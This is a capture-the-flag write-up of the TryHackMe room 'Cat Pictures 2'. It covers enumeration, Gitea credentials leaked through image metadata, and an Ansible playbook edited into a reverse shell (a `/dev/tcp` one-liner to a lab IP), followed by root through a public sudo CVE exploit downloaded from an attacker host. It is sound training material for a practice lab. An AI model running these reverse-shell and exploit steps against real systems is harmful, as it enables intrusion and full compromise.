---
title: "TryHackMe - Cat Pictures 2"
author: Nasrallah
description: ""
date: 2023-06-13 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, sudo, cve, ansible, gitea]
img_path: /assets/img/tryhackme/catpictures2
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Cat Pictures 2](https://tryhackme.com/room/catpictures2) from [TryHackMe](https://tryhackme.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.138.150                                                                                                                     [66/78]
Host is up (0.14s latency).                                                                                                                                   
Not shown: 995 closed tcp ports (reset)                                                                                                                       
PORT     STATE SERVICE VERSION                                                                                                                                
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)                                                                           
| ssh-hostkey:                                                                                                                                                
|   2048 33f0033626368c2f88952cacc3bc6465 (RSA)                                                                                                               
|   256 4ff3b3f26e0391b27cc053d5d4038846 (ECDSA)                                                                                                              
|_  256 137c478b6ff8f46b429af2d53d341352 (ED25519)                                                                                                            
80/tcp   open  http    nginx 1.4.6 (Ubuntu)                                                                                                                   
| http-git:                                                                                                                                                   
|   10.10.138.150:80/.git/                                                                                                                                    
|     Git repository found!                                                                                                                                   
|     Repository description: Unnamed repository; edit this file 'description' to name the...                                                                 
|     Remotes:                                                                                                                                                
|       https://github.com/electerious/Lychee.git                                                                                                             
|_    Project type: PHP application (guessed from .gitignore)                                                                                                 
|_http-title: Lychee                                                                                                                                          
|_http-server-header: nginx/1.4.6 (Ubuntu)                                                                                                                    
| http-robots.txt: 7 disallowed entries                                                                                                                       
|_/data/ /dist/ /docs/ /php/ /plugins/ /src/ /uploads/                                                                                                        
222/tcp  open  ssh     OpenSSH 9.0 (protocol 2.0)                                                                                                             
| ssh-hostkey:                                                                                                                                                
|   256 becb061f330f6006a05a06bf065333c0 (ECDSA)                                                                                                              
|_  256 9f0798926efd2c2db093fafee8950c37 (ED25519)
3000/tcp open  ppp?                                                                                                                                    [41/78]
| fingerprint-strings:                                                                                                                                        
|   GenericLines, Help, RTSPRequest:                                                                                                                          
|     HTTP/1.1 400 Bad Request                                                                                                                                
|     Content-Type: text/plain; charset=utf-8                                                                                                                 
|     Connection: close                                                                                                                                       
|     Request                                                                                                                                                 
|   GetRequest:                                                                                                                                               
|     HTTP/1.0 200 OK                                                          
|     Cache-Control: no-store, no-transform                               
|     Content-Type: text/html; charset=UTF-8                              
|     Set-Cookie: i_like_gitea=3e2d9c0bcdff41b1; Path=/; HttpOnly; SameSite=Lax 
|     Set-Cookie: _csrf=hEu2tGDuq6rCjpi_e-yIvaG9nio6MTY5MTgzNTI1NjI0NzA5NjMzMA; Path=/; Expires=Sun, 13 Aug 2023 10:14:16 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
8080/tcp open  http    SimpleHTTPServer 0.6 (Python 3.6.9)                
|_http-title: Welcome to nginx!                                                
|_http-server-header: SimpleHTTP/0.6 Python/3.6.9
```

We found 5 open ports, two OpenSSH servers (22 and 222), and 3 web servers.

## Web

Let's check the web servers.

### Port 80

![](1.png)

This is a photo-management website hosted with `lychee`.

The log in form reveals the version

![](4.png)

This version doesn't have any vulnerabilities.

### Port 3000

![](2.png)

This is Gitea version 1.17.3, also not vulnerable.

We can see there is a user registered.

![](5.png)


### Port 8080

![](3.png)

This is the default page for nginx, nothing interesting.

Back to port 80, checking the description of the images there we find something interesting.

![](6.png)

There is a meta data in that pictures, let's download it and see what we can find.

![](7.png)

There is text file in the nginx server, let's navigate to it.

![](8.png)

We found credentials for Gitea, and also the notes informs us there is an ansible runner on port 1337.

## Gitea

Let's login to Gitea.

![](9.png)

We found a repository called ansible that has our first flag and a `playbook.yaml` file.

![](10.png)

This seems to run the command whoami as user `bismuth`

## Ansible

Let's check the Ansible runner on port 1337

![](11.png)

Here we can run an Ansible playbook, let's do it and check the logs.

![](12.png)

The playbook it run seems to be the one we found in the Gitea repository!


# **Foothold**

Let's replace the `whoami` command in `playbook.yaml` to a reverse shell.

```bash
bash -c "bash -i >& /dev/tcp/10.10.10.10/9001 0>&1"
```

![](13.png)

Let's commit the changes, setup a listener and run the playbook

![](14.png)

Great! We got the shell.

We can find a private ssh key in `bismuth`'s home directory, use it to get a better shell

# **Privilege Escalation**

Let's run `linpeas`

![](15.png)

The sudo version running on this box is vulnerable.

We can find an exploit [here](https://github.com/CptGibbon/CVE-2021-3156.git)

Let's upload the exploit, compile it and run it.

using `wget -r -np http://attacker.com/` we can download the whole directory.

![](16.png)

We got root!

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

